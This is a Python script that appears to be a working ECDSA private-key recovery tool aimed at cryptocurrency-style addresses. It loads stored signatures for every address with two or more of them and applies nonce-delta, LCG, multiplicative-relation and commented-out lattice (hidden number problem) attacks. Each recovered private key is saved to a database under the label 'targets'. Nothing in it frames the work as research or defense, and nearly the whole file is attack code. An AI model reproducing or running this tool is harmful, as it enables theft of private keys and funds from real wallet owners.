import sys
from db_manager import get_signatures, add_recovered_key, get_connection
from lattice_nonce_analyzer import verify_key, solve_hnp

P = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141

def solve_quadratic(A, B, C):
    if A == 0:
        if B == 0: return []
        return [(-C * pow(B, -1, P)) % P]
    
    delta = (B*B - 4*A*C) % P
    
    def tonelli_shanks(n, p):
        if pow(n, (p - 1) // 2, p) != 1: return None
        s = 0
        q = p - 1
        while q % 2 == 0:
            q //= 2
            s += 1
        if s == 1: return pow(n, (p + 1) // 4, p)
        z = 2
        while pow(z, (p - 1) // 2, p) != p - 1:
            z += 1
        c = pow(z, q, p)
        r = pow(n, (q + 1) // 2, p)
        t = pow(n, q, p)
        m = s
        while t != 1:
            i = 1
            temp = pow(t, 2, p)
            while temp != 1 and i < m:
                temp = pow(temp, 2, p)
                i += 1
            if i == m: return None
            b = pow(c, 2**(m - i - 1), p)
            r = (r * b) % p
            t = (t * b * b) % p
            c = (b * b) % p
            m = i
        return r

    sqrt_delta = tonelli_shanks(delta, P)
    if sqrt_delta is None: return []
    
    inv_2a = pow(2 * A, -1, P)
    x1 = ((-B + sqrt_delta) * inv_2a) % P
    x2 = ((-B - sqrt_delta) * inv_2a) % P
    return [x1, x2]

def try_nonce_delta(sigs, address):
    print(f"Checking for Nonce Deltas in {len(sigs)} sigs for {address}...")
    
    # 1. Intra-TX check (high probability, fast)
    tx_groups = {}
    for sig in sigs:
        if sig['txid'] not in tx_groups:
            tx_groups[sig['txid']] = []
        tx_groups[sig['txid']].append(sig)
    
    for txid, group in tx_groups.items():
        if len(group) < 2: continue
        for i in range(len(group)):
            for j in range(i + 1, len(group)):
                s1, s2 = group[i], group[j]
                for delta in range(-100, 101):
                    if delta == 0: continue
                    num = (s1['s'] * s2['s'] * delta + s1['s'] * s2['z'] - s2['s'] * s1['z']) % P
                    den = (s2['s'] * s1['r'] - s1['s'] * s2['r']) % P
                    
                    if den != 0:
                        d = (num * pow(den, -1, P)) % P
                        if verify_key(d, address):
                            print(f"!!! SUCCESS !!! Nonce delta found in tx {txid}: k_{i} = k_{j} + {delta}")
                            add_recovered_key(address, hex(d)[2:].zfill(64), method='Nonce Delta')
                            return True
                            
    # 2. Cross-TX check (lower probability, slower)
    # Use a limit if there are too many signatures to avoid O(N^2)
    max_cross = 100
    subset = sigs[:max_cross]
    if len(sigs) > max_cross:
        print(f"  Limiting cross-TX delta check to first {max_cross} sigs...")
    
    prep = []
    for s in subset:
        try:
            s_inv = pow(s['s'], -1, P)
            prep.append({'u': (s_inv * s['z']) % P, 't': (s_inv * s['r']) % P, 'txid': s['txid']})
        except: continue
        
    for i in range(len(prep)):
        for j in range(i + 1, len(prep)):
            p1, p2 = prep[i], prep[j]
            if p1['txid'] == p2['txid']: continue # Already checked
            
            dt = (p1['t'] - p2['t']) % P
            if dt == 0: continue
            dt_inv = pow(dt, -1, P)
            
            for delta in range(-10, 11): # Smaller range for cross-TX
                if delta == 0: continue
                d = ((p2['u'] - p1['u'] + delta) * dt_inv) % P
                if verify_key(d, address):
                    print(f"!!! SUCCESS !!! Cross-TX Nonce delta found: k_{i} = k_{j} + {delta}")
                    add_recovered_key(address, hex(d)[2:].zfill(64), method='Cross-TX Nonce Delta')
                    return True
                    
    return False

def try_nonce_lcg(sigs, address):
    print(f"Checking for LCG Nonce Relations in {len(sigs)} sigs for {address}...")
    tx_groups = {}
    for sig in sigs:
        if sig['txid'] not in tx_groups:
            tx_groups[sig['txid']] = []
        tx_groups[sig['txid']].append(sig)
    
    for txid, group in tx_groups.items():
        if len(group) < 4: continue
        for i in range(len(group) - 3):
            s = group[i:i+4]
            u = []
            t = []
            for sig in s:
                s_inv = pow(sig['s'], -1, P)
                u.append((s_inv * sig['z']) % P)
                t.append((s_inv * sig['r']) % P)
            
            du = [u[1]-u[0], u[2]-u[1], u[3]-u[2]]
            dt = [t[1]-t[0], t[2]-t[1], t[3]-t[2]]
            
            A = (dt[1]*dt[1] - dt[2]*dt[0]) % P
            B = (2*du[1]*dt[1] - du[2]*dt[0] - du[0]*dt[2]) % P
            C = (du[1]*du[1] - du[2]*du[0]) % P
            
            roots = solve_quadratic(A, B, C)
            for d in roots:
                if verify_key(d, address):
                    print(f"!!! SUCCESS !!! LCG relation found in tx {txid}")
                    add_recovered_key(address, hex(d)[2:].zfill(64), method='LCG Relation')
                    return True
    return False

def try_nonce_multiplicative(sigs, address):
    print(f"Checking for Multiplicative Nonce Relations (k_i = c * k_j) in {len(sigs)} sigs...")
    tx_groups = {}
    for sig in sigs:
        if sig['txid'] not in tx_groups:
            tx_groups[sig['txid']] = []
        tx_groups[sig['txid']].append(sig)
    
    # Check within TX groups first (high probability)
    for txid, group in tx_groups.items():
        if len(group) < 2: continue
        for i in range(len(group)):
            for j in range(i + 1, len(group)):
                s1, s2 = group[i], group[j]
                # Ensure values are integers
                try:
                    s1_s, s1_z, s1_r = int(s1['s']), int(s1['z']), int(s1['r'])
                    s2_s, s2_z, s2_r = int(s2['s']), int(s2['z']), int(s2['r'])
                except (KeyError, TypeError, ValueError):
                    continue
                    
                for c in range(1, 101):
                    for val_c in [c, pow(c, -1, P)]:
                        num = (s1_s * val_c * s2_z - s2_s * s1_z) % P
                        den = (s2_s * s1_r - s1_s * val_c * s2_r) % P
                        if den != 0:
                            d = (num * pow(den, -1, P)) % P
                            if verify_key(d, address):
                                print(f"!!! SUCCESS !!! Multiplicative relation found in tx {txid}: k_{i} = {val_c} * k_{j}")
                                add_recovered_key(address, hex(d)[2:].zfill(64), method='Multiplicative Nonce')
                                return True
    
    # Check cross-TX relations with a limit
    if len(sigs) > 100:
        print(f"Limiting cross-TX multiplicative check to first 100 sigs...")
        sigs_subset = sigs[:100]
    else:
        sigs_subset = sigs
    
    for i in range(len(sigs_subset)):
        for j in range(i + 1, len(sigs_subset)):
            s1, s2 = sigs_subset[i], sigs_subset[j]
            # Skip if already checked in the same TX
            if s1['txid'] == s2['txid']: continue
            
            # Ensure values are integers
            try:
                s1_s, s1_z, s1_r = int(s1['s']), int(s1['z']), int(s1['r'])
                s2_s, s2_z, s2_r = int(s2['s']), int(s2['z']), int(s2['r'])
            except (KeyError, TypeError, ValueError):
                continue
                
            for c in range(1, 11): # Smaller range for cross-TX
                for val_c in [c, pow(c, -1, P)]:
                    num = (s1_s * val_c * s2_z - s2_s * s1_z) % P
                    den = (s2_s * s1_r - s1_s * val_c * s2_r) % P
                    if den != 0:
                        d = (num * pow(den, -1, P)) % P
                        if verify_key(d, address):
                            print(f"!!! SUCCESS !!! Cross-TX Multiplicative relation found")
                            add_recovered_key(address, hex(d)[2:].zfill(64), method='Cross-TX Multiplicative')
                            return True
    return False

def try_lsb_lattice(sigs, address, bias_val=0):
    print(f"Checking for LSB bias for {address} in {len(sigs)} sigs (val={bias_val})...")
    # Use fewer sigs for speed
    subset_n = min(len(sigs), 30)
    subset_sigs = sigs[:subset_n]
    
    # Try bias bits from 1 to 160
    for b in [8, 12, 16, 20, 24, 32, 64]: # Prioritize common biases
        inv_2b = pow(2**b, -1, P)
        fake_sigs = []
        for i in range(subset_n):
            # Transform for non-zero LSB: k = A * 2^b + V
            # s * (A * 2^b + V) = z + r * d
            # s * A * 2^b = (z - s * V) + r * d
            # s * A = (z - s * V) * 2^-b + r * 2^-b * d
            new_z = ((subset_sigs[i]['z'] - subset_sigs[i]['s'] * bias_val) * inv_2b) % P
            fake_sigs.append({
                'r': (subset_sigs[i]['r'] * inv_2b) % P,
                's': subset_sigs[i]['s'],
                'z': new_z
            })
            
        key = solve_hnp(fake_sigs, b, address=address)
        if key:
            print(f"!!! SUCCESS at LSB bias_bits={b}, val={bias_val} !!!")
            add_recovered_key(address, hex(key)[2:].zfill(64), method=f'LSB Lattice ({b} bits, val={bias_val})')
            return True
    return False

def try_msb_lattice(sigs, address):
    print(f"Checking for MSB bias for {address} in {len(sigs)} sigs...")
    subset_n = min(len(sigs), 30)
    subset_sigs = sigs[:subset_n]
    
    for b in [8, 12, 16, 20, 24, 32, 64]:
        key = solve_hnp(subset_sigs, b, address=address)
        if key:
            print(f"!!! SUCCESS at MSB bias_bits={b} !!!")
            add_recovered_key(address, hex(key)[2:].zfill(64), method=f'MSB Lattice ({b} bits)')
            return True
    return False

def run_advanced_attacks():
    conn = get_connection()
    cursor = conn.cursor()
    # Get addresses with at least 2 signatures (HNP/Lattice need at least 2)
    cursor.execute("SELECT address FROM signatures GROUP BY address HAVING count(*) >= 2")
    addresses = [row[0] for row in cursor.fetchall()]
    conn.close()

    print(f"Running advanced attacks on {len(addresses)} targets...")
    for addr in addresses:
        sigs = get_signatures(addr)
        if len(sigs) >= 4:
            if try_nonce_lcg(sigs, addr): continue
        
        if try_nonce_delta(sigs, addr): continue
        if try_nonce_multiplicative(sigs, addr): continue
        #if try_msb_lattice(sigs, addr): continue
        #if try_lsb_lattice(sigs, addr): continue

if __name__ == "__main__":
    run_advanced_attacks()
